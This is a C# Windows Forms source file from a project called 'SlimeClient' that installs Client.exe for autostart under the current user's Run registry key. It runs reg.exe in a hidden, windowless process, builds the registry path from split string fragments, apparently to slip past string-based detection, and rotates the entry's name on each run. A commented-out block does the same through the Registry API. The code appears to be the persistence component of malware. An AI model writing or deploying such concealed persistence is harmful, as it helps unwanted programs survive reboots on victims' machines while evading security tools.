using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace SlimeClient
{
    public partial class SetupProgramForm : Form
    {
        private DirectoryInfo Info;
        public Exception Ex = null;
        public SetupProgramForm(DirectoryInfo fileInfo)
        {
            Info = fileInfo;
            InitializeComponent();
        }

        private void FormShown(object sender, EventArgs e)
        {
            try
            {
                string NwName = "Client V0.0.1";
                FileInfo info = new FileInfo(Path.Combine(Info.FullName, "StartInfo.id"));
                string sp1 = "USER\\Software\\Microsoft\\Wind";
                string sp2 = "HKEY_CURRENT_";
                string sp3 = "ows\\CurrentVersion\\Run";
                if (info.Exists)
                {
                    string OdName = null;
                    try { OdName = File.ReadAllText(info.FullName); } catch {  }
                    if (OdName == null)
                        OdName = "Client V0.0.1";
                    NwName = string.Format("Client V0.0.{0}", int.Parse(Regex.Replace(OdName, @"\D", "")) + 1);
                    ProcessBackgroundStart("reg", string.Format("Delete \"{0}{1}{2}\" /V \"{3}\" /f", sp2, sp1, sp3, OdName), true);
                }
                try { File.WriteAllText(info.FullName, NwName); } catch { }
                ProcessBackgroundStart("reg", string.Format("Add \"{0}{1}{2}\" /v \"{3}\" /t REG_SZ /d \"{4}\" /f", sp2, sp1, sp3, NwName, Info.FullName + @"\Client.exe"), true);

                //SLog("RefreshStartupProgram");
                //string keyName = null;
                //string ProcessName = "Client";
                //RegistryKey rkey = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true); //LocalMachine
                //foreach (string item in rkey.GetValueNames())
                //{
                //    if (item.Contains(ProcessName))
                //    {
                //        Console.WriteLine(item);
                //        keyName = item;
                //        rkey.DeleteValue(item);
                //    }
                //}
                //if (keyName == null)
                //    keyName = "0";
                //keyName = Regex.Replace(keyName, @"\D", "");
                //string newVersion = string.Format("{0} V0.0.{1}", ProcessName, int.Parse(keyName == null ? "0" : keyName) + 1);
                //Console.WriteLine(newVersion);
                //rkey.SetValue(newVersion, Path.Combine(Info.FullName, "Client.exe"));
                //rkey.Close();
            }
            catch (Exception ex)
            {
                Ex = ex;
                //ExceptionLog(ex, "RefreshStartupProgram");
            }
            Close();
        }

        #region ProcessBackgroundStart
        private static CommandReturn ProcessBackgroundStart(string FileName, string Args, bool WaitForExit, int TimeOut = -1)
        {
            try
            {
                Process process = new Process();
                process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                process.StartInfo.CreateNoWindow = true;
                process.StartInfo.RedirectStandardInput = true;
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.RedirectStandardError = true;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.FileName = FileName;
                process.StartInfo.Arguments = Args;
                process.Start();
                if (WaitForExit)
                {
                    if (TimeOut == -1)
                        process.WaitForExit();
                    else
                        process.WaitForExit(TimeOut);
                    return new CommandReturn(true, string.Format("ExitCode: {0}", process.ExitCode));
                }
                return new CommandReturn(true, "None");
            }
            catch (Exception ex)
            {
                return new CommandReturn(false, ex.ToString());
            }
        }
        #endregion
    }
}
